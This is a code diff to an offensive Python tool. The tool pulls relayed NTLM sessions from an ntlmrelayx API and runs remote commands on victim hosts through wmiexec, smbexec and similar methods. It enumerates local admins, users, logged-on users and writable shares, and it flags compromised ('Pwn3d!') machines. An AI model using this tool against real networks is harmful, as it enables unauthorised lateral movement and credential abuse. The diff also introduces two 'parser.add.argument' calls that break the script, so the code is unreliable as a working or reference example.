@@ -1,10 +1,10 @@
 import os
-import re
 import sys
 import argparse
 import requests
 from collections import defaultdict
 import subprocess
+import re
 
 # Function to fetch data from the ntlmrelayx HTTPAPI
 def fetch_data_from_api(api_url):
@@ -73,17 +73,16 @@ def parse_cache(cache_file):
                     cache_ips.add(ip)
                     cache_actions[action].add(ip)
                 except ValueError:
-                    # Optionally, you can suppress this warning
-                    # print(f"Warning: Skipping malformed line in cache file: {line.strip()}")
                     continue
     return cache_ips, cache_actions
 
 # Function to save action and IPs to the cache file
-def update_cache(cache_file, action_name, ips):
+def update_cache(cache_file, action_name, ips, debug=False):
     with open(cache_file, 'a') as file:
         for ip in ips:
             entry = f"Action: {action_name} on {ip}\n"
-            print(f"Writing to cache: {entry.strip()}")  # Debugging print
+            if debug:
+                print(f"Writing to cache: {entry.strip()}")  # Debugging print
             file.write(entry)
 
 # Function to update cache status and re-check after action
@@ -112,6 +111,7 @@ def select_systems(available_ips):
         else:
             print("No valid IPs entered. Please try again.")
 
+# Function to apply color coding to the output
 def color_text(text, color_code):
     return f"\033[{color_code}m{text}\033[0m"
 
@@ -124,6 +124,8 @@ def apply_coloring(output):
     output = re.sub(r'\(Pwn3d!\)', color_text('(Pwn3d!)', '33;1'), output)
     # Color "User accounts for \\" in bold yellow
     output = re.sub(r'(User accounts for \\\\)', color_text(r'\1', '33;1'), output)
+    # Color "READ,WRITE" in bold green for List shares
+    output = re.sub(r'(READ,WRITE)', color_text(r'\1', '32;1'), output)
 
     return output
 
@@ -137,6 +139,8 @@ def execute_command(ip, domain_user, action_name, output_file, cache_file, avail
     # Commands based on action name
     if action_name == "List local admins":
         command = f"{base_command} -x 'net localgroup Administrators'"
+    elif action_name == "List local users":
+        command = f"{base_command} --users"
     elif action_name == "Logged on users":
         command = f"{base_command} --loggedon-users"
     elif action_name == "List shares":
@@ -277,7 +281,7 @@ def handle_action_selection(category, true_lines, cache_file, cache_actions, arg
                 
                 if first_admin_user:
                     execute_command(first_ip, first_admin_user, action_name, args.output_file, cache_file, available_ips, args.exec_method, args.grep, args.grep_before, args.grep_after)
-                    update_cache(cache_file, action_name, [first_ip])
+                    update_cache(cache_file, action_name, [first_ip], debug=args.debug)
                 else:
                     print(f"No known admin user found for {first_ip}. Skipping.")
 
@@ -296,7 +300,7 @@ def handle_action_selection(category, true_lines, cache_file, cache_actions, arg
                             break
                     if admin_user:
                         execute_command(ip, admin_user, action_name, args.output_file, cache_file, available_ips, args.exec_method, args.grep, args.grep_before, args.grep_after)
-                        update_cache(cache_file, action_name, [ip])
+                        update_cache(cache_file, action_name, [ip], debug=args.debug)
                     else:
                         print(f"No known admin user found for {ip}. Skipping.")
             else:
@@ -314,7 +318,7 @@ def handle_action_selection(category, true_lines, cache_file, cache_actions, arg
                     
                     if first_admin_user:
                         execute_command(first_ip, first_admin_user, action_name, args.output_file, cache_file, available_ips, args.exec_method, args.grep, args.grep_before, args.grep_after)
-                        update_cache(cache_file, action_name, [first_ip])
+                        update_cache(cache_file, action_name, [first_ip], debug=args.debug)
                     else:
                         print(f"No known admin user found for {first_ip}. Skipping.")
                     
@@ -333,7 +337,7 @@ def handle_action_selection(category, true_lines, cache_file, cache_actions, arg
                                 break
                         if admin_user:
                             execute_command(ip, admin_user, action_name, args.output_file, cache_file, available_ips, args.exec_method, args.grep, args.grep_before, args.grep_after)
-                            update_cache(cache_file, action_name, [ip])
+                            update_cache(cache_file, action_name, [ip], debug=args.debug)
                         else:
                             print(f"No known admin user found for {ip}. Skipping.")
                 elif target_ips in {'q', 'quit', 'exit', 'back'}:
@@ -379,9 +383,9 @@ def main():
     parser.add_argument("--grep-after", "-A", type=int, help="Number of lines to show after the matching line (alias: -A).", default=0)
     
     parser.add_argument("--input_file", help="Path to the input text file (optional).")
-    parser.add_argument("--output_file", help="Path to the output file (optional). If not provided, output will be printed to screen.")
+    parser.add.argument("--output_file", help="Path to the output file (optional). If not provided, output will be printed to screen.")
     parser.add_argument("--no-cache", action="store_true", help="Run without using the cache file.")
-    parser.add_argument("--port", type=int, default=9090, help="Port for ntlmrelayx HTTPAPI (default: 9090).")
+    parser.add.argument("--port", type=int, default=9090, help="Port for ntlmrelayx HTTPAPI (default: 9090).")
     parser.add_argument("--exec_method", choices=["wmiexec", "smbexec", "mmcexec", "atexec"], help="Specify the exec-method to use.")
     parser.add_argument("--debug", action="store_true", help="Enable debug mode to print systems and users data.")
     
@@ -447,4 +451,3 @@ def main():
 
 if __name__ == "__main__":
     main()
- 
